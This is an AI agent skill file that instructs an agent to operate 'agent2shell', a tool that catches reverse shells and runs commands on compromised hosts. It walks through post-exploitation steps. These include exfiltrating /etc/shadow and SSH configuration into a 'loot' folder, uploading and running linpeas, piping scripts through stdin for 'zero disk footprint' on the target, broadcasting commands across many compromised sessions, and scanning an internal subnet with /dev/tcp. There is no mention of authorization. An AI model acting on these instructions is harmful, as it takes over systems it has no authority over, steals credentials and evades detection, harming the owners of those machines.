---
name: agent2shell-reverse-shell-agent
description: >
  Use when an AI agent needs to execute commands on reverse shell targets via
  agent2shell, upload or download files to/from compromised hosts, check
  session status, broadcast commands across multiple sessions, or pipe scripts
  via stdin without disk footprint. Triggers on: "run a command on the target",
  "upload to the target", "download from the target", "check active sessions",
  "agent2shell", "reverse shell", "push/pull files", "pipe script via stdin".
---

# agent2shell — AI Agent Skill

agent2shell catches reverse shell connections over TCP and exposes them as structured JSON APIs via Unix domain sockets. You interact with the target by running `agent2shell` commands.

## When to Use

- Execute commands on a compromised target (`agent2shell run`)
- Upload or download files to/from the target (`push`/`pull`)
- Pipe local scripts to the target without writing to disk (`run --stdin`)
- Check session metadata or list active sessions (`status`/`list`)
- Broadcast commands across multiple sessions (`broadcast`)

## Prerequisites

- `agent2shell` binary in PATH or accessible by absolute path
- An active session (someone ran `agent2shell catch -p <port>` and a reverse shell connected)
- Optional: `--log /path/to/file.jsonl` on catch to record all exec commands with timestamps
- Optional: `--auto-upgrade` on catch to attempt sh → bash upgrade on connect
- The Unix socket exists at `/tmp/a2s-N.sock` (auto-discovered) or a specific path via `-s`

## Commands

### Execute a command on the target

```bash
agent2shell run <command>
```

Returns the command output on stdout. Exit code is forwarded from the remote command (0-125). Exit 126 means agent2shell error (timeout, connection refused).

Examples:
```bash
agent2shell run whoami
agent2shell run id
agent2shell run uname -a
agent2shell run cat /etc/hostname
agent2shell run "cat /etc/passwd | grep root"
agent2shell run ls -la /tmp
agent2shell run -t 60 "find / -perm -4000 -type f 2>/dev/null"
```

Flags in the remote command work without `--` separator:
```bash
agent2shell run ls -la /root    # works — -la is part of the remote command
agent2shell run -t 10 whoami    # -t is agent2shell's timeout flag
```

### Pipe a local script via stdin

```bash
agent2shell run --stdin <local-file> [interpreter]
```

Pipes a local file's content as stdin to the remote shell without writing to disk on the target. When no interpreter is specified, defaults to `bash`. Works with any interpreter available on the target:

```bash
agent2shell run --stdin ./linpeas.sh                      # pipe to bash (default)
agent2shell run -t 300 --stdin ./linpeas.sh               # with timeout for long scripts
agent2shell run --stdin ./recon.py python3                 # pipe to python
agent2shell run --stdin ./dump.php php                     # pipe to PHP
agent2shell run --stdin ./enum.pl perl                     # pipe to Perl
echo 'SELECT user();' | agent2shell run --stdin - mysql    # pipe from OS stdin
```

Use `--stdin` instead of `push` when you want zero disk footprint on the target — the script runs entirely through the shell's stdin.

### Get session metadata

```bash
agent2shell status
agent2shell status --json
```

Returns: remote address, shell type, user, hostname, OS, architecture, distro, connection time, commands executed.

### List active sessions

```bash
agent2shell list
agent2shell list --json
```

Auto-discovers all `/tmp/a2s-*.sock` sockets and queries each.

### Upload a file to the target

```bash
agent2shell push <local-path> <remote-path>
```

Base64-chunked transfer with MD5 checksum verification. Use for uploading tools, scripts, or payloads.

```bash
agent2shell push ./linpeas.sh /tmp/linpeas.sh
agent2shell run "chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh"
```

### Download a file from the target

```bash
agent2shell pull <remote-path> <local-path>
```

```bash
agent2shell pull /etc/shadow ./loot/shadow
agent2shell pull /tmp/dump.sql ./loot/dump.sql
```

### Execute across multiple sessions

```bash
agent2shell broadcast --all <command>
agent2shell broadcast --tag webserver whoami
agent2shell broadcast --all --json id
```

### Target a specific session

When multiple sessions are active, use `-s` BEFORE the subcommand to target a specific socket:
```bash
agent2shell -s /tmp/a2s-2.sock run whoami
agent2shell -s /tmp/a2s-2.sock status
```

Without `-s`, agent2shell auto-discovers. If exactly one session exists, it's used automatically. If multiple exist, it returns an error asking you to specify.

### Session tagging

Tags are set when catching a shell. They allow grouping sessions for `broadcast` and `list --tag`:
```bash
agent2shell catch -p 4444 --tag webserver
agent2shell catch -p 5555 --tag database
```

`-s` targets ONE socket. `--tag` targets ALL sessions with that tag. Single-target commands (`run`, `status`, `push`, `pull`) only support `-s`.

## Workflow Patterns

### Running Scripts on the Target

Use `--stdin` when you want zero disk footprint (script runs entirely through stdin):
```bash
agent2shell run -t 300 --stdin ./linpeas.sh
```

Use `push` when the script needs to persist on the target (run multiple times, share across sessions):
```bash
agent2shell push ./linpeas.sh /tmp/linpeas.sh
agent2shell run "chmod +x /tmp/linpeas.sh"
agent2shell run "/tmp/linpeas.sh"
```

### File Exfiltration

```bash
mkdir -p ./loot
agent2shell pull /etc/shadow ./loot/shadow
agent2shell pull /etc/ssh/sshd_config ./loot/sshd_config
```

### Multi-Target Operations

List all sessions:
```bash
agent2shell list --json
```

Run on all targets:
```bash
agent2shell broadcast --all whoami
agent2shell broadcast --all "cat /etc/hostname"
```

Run on tagged targets only (tags are set with `catch --tag <name>`):
```bash
agent2shell broadcast --tag webserver "ss -tlnp"
```

## Remote Access via SSH Tunnel

When agent2shell runs on a remote server (e.g., EC2), forward the Unix socket to your local machine:

```bash
ssh -NL /tmp/a2s-remote.sock:/tmp/a2s-1.sock user@server-ip -i key.pem
```

Then use agent2shell locally with `-s` before the subcommand:

```bash
agent2shell -s /tmp/a2s-remote.sock run whoami
agent2shell -s /tmp/a2s-remote.sock status
```

## Error Handling

- Exit code **0-125**: forwarded from the remote command
- Exit code **124**: command timed out (increase with `-t`)
- Exit code **126**: agent2shell error (no session, connection refused)
- Exit code **127**: CLI error (bad flags, unknown command)

If a command times out (default 30s), increase with `-t`:

```bash
agent2shell run -t 120 "find / -name '*.conf' 2>/dev/null"
```

If no session is found, verify the listener is running and a shell has connected:

```bash
ls -la /tmp/a2s-*.sock
agent2shell list
```

## Long-Running Commands

Output is streamed line-by-line by default. Use `-t` (seconds) to increase the timeout beyond the default 30s:

```bash
agent2shell run -t 300 --stdin ./linpeas.sh               # via stdin (no disk)
agent2shell run -t 300 "/tmp/linpeas.sh"                   # via push (on disk)
```

For network scanning, wrap each connection with `timeout` to avoid hanging on unresponsive hosts:

```bash
agent2shell run -t 60 'for i in $(seq 1 254); do timeout 2 bash -c "echo >/dev/tcp/10.0.0.$i/80 2>/dev/null" && echo "10.0.0.$i:80 OPEN"; done'
```

## Important Notes

- Commands are serialized — one at a time per session. Concurrent `run` calls queue.
- Output is streamed line-by-line as it arrives. Use `--no-stream` to buffer all output and return it at the end.
- File transfer uses base64 encoding over the shell — no separate channel. Large files are chunked.
- The session detects the target's shell, OS, user, hostname, and architecture automatically on connect.
- All output is clean — no terminal escape codes, no prompt pollution, no marker artifacts.
